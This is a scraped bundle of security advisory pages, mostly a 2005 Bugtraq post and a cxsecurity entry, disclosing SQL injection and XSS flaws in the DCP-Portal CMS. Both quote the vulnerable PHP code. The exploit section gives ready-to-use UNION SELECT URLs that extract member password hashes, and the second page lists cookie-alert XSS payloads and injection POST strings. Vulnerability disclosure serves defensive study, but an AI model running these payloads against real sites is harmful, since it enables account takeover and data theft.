=== Content from cxsecurity.com_f85122bb_20250126_063814.html ===


---

# Security check:

Captcha. You know what to do. (CXSECURITYIDS)

---



=== Content from marc.info_2347d834_20250125_061625.html ===

```
[[prev in list](?l=bugtraq&m=110860200803990&w=2)] [[next in list](?l=bugtraq&m=110858342811298&w=2)] [prev in thread] [next in thread]
List:       [bugtraq](?l=bugtraq&r=1&w=2)
Subject:    [hackgen-2005-#003] - SQL injection bugs in DCP-Portal
From:       [Exoduks <exoduks () gmail ! com>](?a=109415352500002&r=1&w=2)
Date:       [2005-02-16 7:13:57](?l=bugtraq&r=1&w=2&b=200502)
Message-ID: [20050216071357.6433.qmail () www ! securityfocus ! com](?i=20050216071357.6433.qmail%20()%20www%20!%20securityfocus%20!%20com)
[Download RAW [message](?l=bugtraq&m=110858497207809&q=mbox) or [body](?l=bugtraq&m=110858497207809&q=raw)]

<http://www.hackgen.org/advisories/hackgen-2005-003.txt>

''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
'                          [hackgen-2005-#003]                       '
''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
'                    SQL injection bugs in DCP-Portal                '
''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''

  Software: DCP-Portal <= 6.1.1
  Homepage: <http://www.dcp-portal.org>
  Author: "Exoduks" - HackGen Team
  Release Date: 16 March, 2005
  Website: [www.hackgen.org](http://www.hackgen.org)
  Mail: exoduks [at] gmail . com

 0x01 - Affected software description:
 -------------------------------------
 DCP-Portal is a content management system with advanced features like web
 based update, link, file, member management, poll, calendar, content informer,
 content sending by members etc. Features: Admin panel to manage the entire site;
 HTML editor to add news and content; Members can submit news and contents, and
 write reviews; Members can receive the added content in e-mail; Mailing list;
 Search engine; Content categories; FAQ; Easy setup; Multi-language support; Forum;
 Message system; member agenda; Ad management. Site design can be changed with just
 one template file, publish in homepage option, .txt file import for contents,
 featured module, works with register_globals=off..

 0x02 - Vulnerability Discription:
 ---------------------------------
 Vulnerabilities exist in prety much all sql queries, some of them are in index.php
 and forums.php. There isn't eny filtering for input string in all $_GET and $_POST
 variables. So it is possible to input evil sql query that will give us for example
 hashed password of user we want. This bug is very critical because we can get and
 admin password. So some evil user deface portal, or delate all database. This can
 be exploited if magic_quotes_gpc is set to Off in php.ini

 0x03 - Vulnerability Code:
 --------------------------
 Vulnerability code in index.php

 ----- beging the code in index.php -----
  ....
  $result = mysql_query("SELECT * FROM  $t_members WHERE uid = '".$_GET["uid"]."' AND \
                hideinfo != '1' ORDER BY username");
  ....
  $sql = mysql_query("SELECT id, name, content FROM $t_faq WHERE cat_id = \
                '".$_GET["lcat"]."' ORDER BY name");
  ....
  $sql = mysql_query("SELECT id, name FROM $t_links WHERE cat_id = \
                '".$_GET["lcat"]."' ORDER BY name");
  ....
  $result = mysql_query("SELECT * FROM $t_docs WHERE cat_id = '".$_GET["dcat"]."' AND \
                active = '1' ORDER BY date DESC");
  ....
 ----- end of the code -----

Vulnerability code in forums.php

 ----- beging the code in forums.php -----
  ....
  $result = mysql_query("SELECT * FROM $t_forums WHERE fid = '".$_GET["bid"]."'");
  ....
  $result = mysql_query("SELECT * FROM $t_forum_msg WHERE tid = '".$_GET["mid"]."'");
  ....
 ----- end of the code -----

 0x04 - How to fix this bug:
 ---------------------------
 Vendor has beed contacted and he we probably publish new version of portal so go to
 <http://www.dcp-portal.org> and look for new version.

 0x05 - Exploit:
 ----------------

 <http://server.com/index.php?page=links&catid=1&lcat=-99%27> UNION SELECT \
null,password FROM   dcp5_members WHERE username=%27[username]

 <http://server.com/index.php?page=documents&doc=-99%27> UNION SELECT \
null,null,username,password,  null,null,null,null,null,null,null,null FROM \
dcp5_members WHERE username=%27[username]

 <http://server.com/index.php?page=mdetails&uid=-99%27> UNION SELECT \
null,null,null,username,null,  \
null,null,null,password,null,null,null,null,null,null,null,null,null,null,null,null \
FROM dcp5_members   WHERE username=%27[username]

 <http://server.com/forums.php?action=showmsg&mid=-99%27> UNION SELECT \
null,null,null,password,null,  username,null,null,null FROM dcp5_members WHERE \
username=%27[username]

 <http://server.com/forums.php?action=board&bid=-99%27UNION> SELECT \
null,null,password,null FROM   dcp5_members WHERE username=%27[username]

 Replace [username] with username which you want to get password for and if you need \
change   dcp5_ prefix. I have tested this on DCP-Portal v6.1.1 and it works !

 0x006 - The End:
 ----------------
 And you have come to end. My threed advisor is out.
 Grejtttzz to: All people who are working on phearless zine which can be readed on
 <http://phearless.headcoders.net>

                         ______________________________________
                          Written By Exoduks - [www.hackgen.org](http://www.hackgen.org)

[[prev in list](?l=bugtraq&m=110860200803990&w=2)] [[next in list](?l=bugtraq&m=110858342811298&w=2)] [prev in thread] [next in thread]

```

[Configure](?q=configure) |
[About](?q=about) |
[News](?q=news) |
Add a list |
Sponsored by [KoreLogic](http://www.korelogic.com/)



=== Content from securityreason.com_d18d74da_20250125_061626.html ===

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  | | **DCP - portal XSS & SQL attacks** **2005.10.24** Credit:  **[alex aleksanet com](https://cxsecurity.com/author/alex%2Baleksanet%2Bcom/1/)**  Risk: **Medium** Local: **No** Remote: ****Yes**** CVE: **[CVE-2005-3365](https://cxsecurity.com/cveshow/CVE-2005-3365/ "Click to see CVE-2005-3365")** | **[CVE-2005-0454](https://cxsecurity.com/cveshow/CVE-2005-0454/ "Click to see CVE-2005-0454")** CWE: **[CWE-89](https://cxsecurity.com/cwe/CWE-89 "Click to see CWE-89")** | | --- | |
| --- | --- | --- | --- |

Web Site: http://www.dcp-portal.org/
DCP Portal <= v6
This script is possibly vulnerable to SQL Injection attacks AND Cross Site Scripting (XSS) attacks
The script has been tested with these query variables:
XSS :
http://[target]/index.php?page=send&cid=<script>alert(document.cookie);<
/script>
XSS - only POST metod
calendar.php
http://[target]/calendar.php
The script has been tested with these POST variables:
month=<script>alert(document.cookie);</script>&s=1&submit=GO&year=2003&d
ay=01
Also this script is possibly vulnerable to SQL Injection attacks.
The SQL Injection attacks has been tested with these POST variables:
register.php
sex=1&name=%27&surname=1&email=1&b\_month=0&b\_day=0&b\_year=0&address=1&zi
p=1&city=1&country=1&job=1&tel=1&signature=1&username=1&password=1&passw
ord2=1&hide=on&list=on&action=send&submit=Send
lostpassword.php
mode=lost&email=%27&submit=Send
calendar.php
month=1&s=1&submit=GO&year='&day=01
month=1&s=1&submit=GO&year=%27&day=01
index.php?cid=%27[SQL]
cod from index.php
$sql = "SELECT id, name FROM $t\_cats WHERE cat\_id = '".$\_GET["cid"]."' ORDER BY sort, name";
$result = mysql\_query($sql);
forums.php?action=showmsg&mid=%27[SQL]
cod from forum.php
$resultt = mysql\_query("SELECT \* FROM $t\_forum\_msg WHERE b\_id = '".$\_GET["bid"]."' $where AND msg\_id = '0'");
while($rowt=mysql\_fetch\_array($resultt)) {
Best Regards
Alex

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2005100055)
[Tweet](https://twitter.com/share)

Vote for this issue:

 0
 0

50%
50%

#### **Thanks for you vote!**

#### **Thanks for you comment!**Your message is in quarantine 48 hours.

Comment it here.
Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  | **{{ x.nick }}**  | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---  {{ x.comment }} |
| --- | --- |

Show all comments

---

Copyright **2025**, cxsecurity.com

  |  |
Back to Top



=== Content from cxsecurity.com_c5fb803d_20250126_063814.html ===


---

# Security check:

Captcha. You know what to do. (CXSECURITYIDS)

---



=== Content from cxsecurity.com_09d7ecef_20250126_063814.html ===


---

# Security check:

Captcha. You know what to do. (CXSECURITYIDS)

---


